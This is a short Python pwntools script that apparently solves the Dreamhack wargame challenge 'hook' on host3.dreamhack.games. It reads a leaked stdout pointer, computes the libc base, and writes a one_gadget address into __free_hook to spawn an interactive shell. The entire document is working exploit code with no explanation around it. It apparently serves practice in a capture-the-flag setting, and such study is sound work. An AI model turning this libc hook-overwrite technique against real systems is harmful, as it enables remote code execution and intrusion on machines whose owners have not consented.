from pwn import *

def slog(name ,addr):
        return success(": ".join([name, hex(addr)]))

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

p = remote("host3.dreamhack.games", 11850)
e = ELF("./hook")
libc = ELF("./libc.so.6")


# [1] Leak base
p.recvuntil("stdout: ")
stdout = int(p.recvline()[:-1], 16)
base = stdout - libc.symbols["_IO_2_1_stdout_"]
free_hook = base + libc.symbols["__free_hook"]
og = base + one_gadget[1]

slog("STDOUT", stdout)
slog("base", base)
slog("one gadget", og)


# [2] Exploit
payload = p64(free_hook) + p64(og)	# free_hook = one_gadget

p.sendlineafter("Size: ", "100")
p.sendlineafter("Data: ", payload)

p.interactive()

